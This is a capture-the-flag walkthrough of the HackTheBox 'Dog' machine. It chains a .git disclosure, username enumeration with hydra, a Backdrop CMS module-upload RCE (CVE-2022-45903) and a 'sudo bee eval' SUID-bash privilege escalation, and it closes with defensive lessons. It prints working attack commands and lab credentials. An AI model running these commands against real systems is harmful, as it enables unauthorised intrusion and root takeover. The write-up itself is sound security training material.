---
title: "Dog"
date: 2025-03-08
type: docs
tags:
  - htb
  - linux
  - easy
  - git-disclosure
  - backdrop-cms
  - cve-2022-45903
  - user-enumeration
  - password-reuse
  - sudo
  - bee
  - gtfobins
---

<div class="callout callout-info">

**Box Info**

**Platform:** HackTheBox, **OS:** Linux (Ubuntu 20.04), **Difficulty:** Easy, **Released:** 2025-03-08, **IP:** `10.10.11.58` → `dog.htb`

</div>

<div class="callout callout-abstract">

**Attack Path**

1. Exposed **`.git/`** on the web root → dump → `settings.php` leaks the Backdrop DB password `BackDropJ2024DS2024`; commit metadata and config leak `tiffany@dog.htb`, `dog@dog.htb`.
2. The login form is a **username oracle** (`Sorry, no account with that email address found.` vs `Cannot send email`). Hydra finds a valid user **`john`**; `john` + the DB password logs into **Backdrop CMS** admin.
3. As admin, install a malicious module (`shell.tar`). **CVE-2022-45903** authenticated RCE. Webshell at `/modules/shell/shell.php` → shell as `www-data`.
4. **Password reuse**. The Backdrop DB password is also the local user **`johncusack`**'s password.
5. `johncusack` may `sudo /usr/local/bin/bee` (the Backdrop CLI). `bee eval` runs arbitrary PHP as root → SUID bash → root.

</div>

<div class="callout callout-key">

**Credentials & Flags**


| Where | Value |
| --- | --- |
| `.git` → `settings.php` (Backdrop DB) | `root : BackDropJ2024DS2024` |
| Backdrop admin | `john : BackDropJ2024DS2024` |
| `johncusack` (password reuse) | `BackDropJ2024DS2024` |
| `user.txt` | `/home/johncusack/user.txt` |
| `root.txt` | `/root/root.txt`. `1d2f8404f9d69d259d2666a6c741b759` |

</div>

---

## Overview

Dog is a compact chain of four well-worn primitives: **`.git` disclosure** for the DB password, an **error-message username oracle** to find the one account that password unlocks, an **authenticated CMS RCE** for `www-data`, and **password reuse** + a **GTFOBins-style `sudo` binary** (`bee eval`) for root. Nothing requires exploitation development. It rewards methodical enumeration and the habit of trying every recovered secret against every known account.

Related `.git` boxes: [Cat](/writeups/hackthebox/linux/medium/cat/), [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/). Related username oracles: [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/). Related `sudo <interpreter>` → root: [Bizness](/writeups/hackthebox/linux/easy/bizness/), and see GTFOBins throughout [Lookup](/writeups/tryhackme/linux/easy/lookup/) / [BackFire](/writeups/hackthebox/linux/medium/backfire/). Related password-reuse-to-root: [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Cat](/writeups/hackthebox/linux/medium/cat/), [Smol](/writeups/tryhackme/linux/medium/smol/).

---

## Full Walkthrough

### Nmap scan

```console
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-git:
|   10.10.11.58:80/.git/
|_    Git repository found!
|_http-generator: Backdrop CMS 1 (https://backdropcms.org)
```

`nmap` already found `/.git/` and fingerprinted **Backdrop CMS**.

### Dump `.git`

```console
$ ./gitdumper.sh http://dog.htb/.git/ dest-dir
[+] Downloaded: HEAD
[+] Downloaded: refs/heads/master
[+] Downloaded: logs/HEAD
...
$ ./extractor.sh ../Dumper/dest-dir/ Dog
```

<div class="callout callout-note">

**`.git` disclosure (see [Cat](/writeups/hackthebox/linux/medium/cat/) for the full explanation)**

`gitdumper` pulls the object store by path; `extractor` replays each commit into its own folder. On Dog the payoff is `settings.php`. Backdrop's DB config. Plus config JSON and commit author emails that seed the username list.

</div>

used the extractor's `settings.php`:

```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

```console
$ grep -iR 'dog.htb' Dog/
.../active/update.settings.json:  "tiffany@dog.htb"
.../commit-meta.txt: author root <dog@dog.htb> 1738963331 +0000
```

### Enumerating users

I was able to use hydra to find a valid user `john`. The password does not work for login on the website, but instead of saying the user doesn't exist it says **"Cannot send email"**.

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \
  -p 'BackDropJ2024DS2024' -f dog.htb http-post-form \
  "/?q=user/login:name=^USER^%40dog.htb&pass=^PASS^&form_build_id=form-...&form_id=user_login&op=Log+in:Sorry, no account with that email address found."
```

```console
[80][http-post-form] host: dog.htb   login: john   password: BackDropJ2024DS2024
```

<div class="callout callout-note">

**Login forms as username oracles**

Backdrop returns a *different* string for "no such account" vs "account exists but the password is wrong / can't email you a reset". That difference is a **user-enumeration oracle**: hydra's `:F=<fail string>` (or here matching the failure text) tells valid from invalid. Once you know the account exists, the recovered DB password often just works. Devs reuse it. Fix: generic "if that account exists, we've emailed you" responses and constant-time handling.

</div>

### Backdrop admin → CVE-2022-45903 → www-data

Log into `/?q=admin` as `john : BackDropJ2024DS2024`.

<div class="callout callout-note">

**CVE-2022-45903, Backdrop CMS authenticated RCE**

An admin can install modules from an uploaded archive. Backdrop doesn't verify the archive contents, so a module directory containing a `.php` webshell plus a minimal `.info` file installs and becomes web-reachable under `/modules/<name>/`. Any admin session is code execution. (Also delivered via the "manual installation" URL feature.)

</div>

uploaded `shell.tar`, then got a shell by visiting `http://dog.htb/modules/shell/shell.php`.

### User. Password reuse

`johncusack` exists in `/home`; **reuse the DB password**:

```bash
su johncusack        # BackDropJ2024DS2024   (SSH also works)
cat user.txt
```

### Privilege Escalation. `sudo bee eval`

```console
(remote) johncusack@dog:/var/www/html$ sudo /usr/local/bin/bee ev "system('cp /bin/bash /tmp/bash && chmod u+s /tmp/bash')"
(remote) johncusack@dog:/tmp$ ./bash -p
(remote) root@dog:/root# cat root.txt
1d2f8404f9d69d259d2666a6c741b759
```

<div class="callout callout-note">

**`bee` = Backdrop's Drush**

`bee` (like `drush`) is a management CLI that bootstraps the CMS and exposes `eval`/`ev` to run arbitrary PHP in the site context. Run via `sudo` it's PHP running as root, which is instant privilege escalation, the same class as `sudo php`, `sudo perl`, `sudo python` on GTFOBins. `bee` must be invoked from the site root, so `cd /var/www/html` first.

</div>

---

## Loot

| Flag | Location |
| --- | --- |
| `user.txt` | `/home/johncusack/user.txt` |
| `root.txt` | `/root/root.txt`. `1d2f8404f9d69d259d2666a6c741b759` |

---

## Lessons & Takeaways

- **Never serve `.git/`.** Block dotfiles at the web server; deploy from artifacts.
- **Don't commit real credentials**. `settings.php` with a live password should never enter version control.
- **Suppress user-enumeration oracles** in auth and password-reset flows.
- **Patch Backdrop** and restrict who can install modules; treat "install from archive" as RCE.
- **Unique passwords**. The DB password unlocking a shell account is the whole box.
- **`sudo` on any interpreter/management CLI is root.** Audit for `bee`, `drush`, `wp`, `artisan`, `rails`, `node`, `php`.

---

## Related Writeups

- **`.git` disclosure:** [Cat](/writeups/hackthebox/linux/medium/cat/), [Pilgrimage](/writeups/hackthebox/linux/easy/pilgrimage/)
- **Username / login oracles:** [Nocturnal](/writeups/hackthebox/linux/easy/nocturnal/), [Previse](/writeups/hackthebox/linux/easy/previse/)
- **Authenticated CMS RCE:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Smol](/writeups/tryhackme/linux/medium/smol/), [Avenger](/writeups/tryhackme/windows/medium/avenger/)
- **`sudo <interpreter>` → root:** [Bizness](/writeups/hackthebox/linux/easy/bizness/), [Lookup](/writeups/tryhackme/linux/easy/lookup/)
- **Password reuse to `root`:** [Blocky](/writeups/hackthebox/linux/easy/blocky/), [Cat](/writeups/hackthebox/linux/medium/cat/), [Smol](/writeups/tryhackme/linux/medium/smol/)

## References

- CVE-2022-45903 (Backdrop CMS) <https://www.exploit-db.com/exploits/52021>
- GitTools <https://github.com/internetwache/GitTools>
- GTFOBins <https://gtfobins.github.io/>
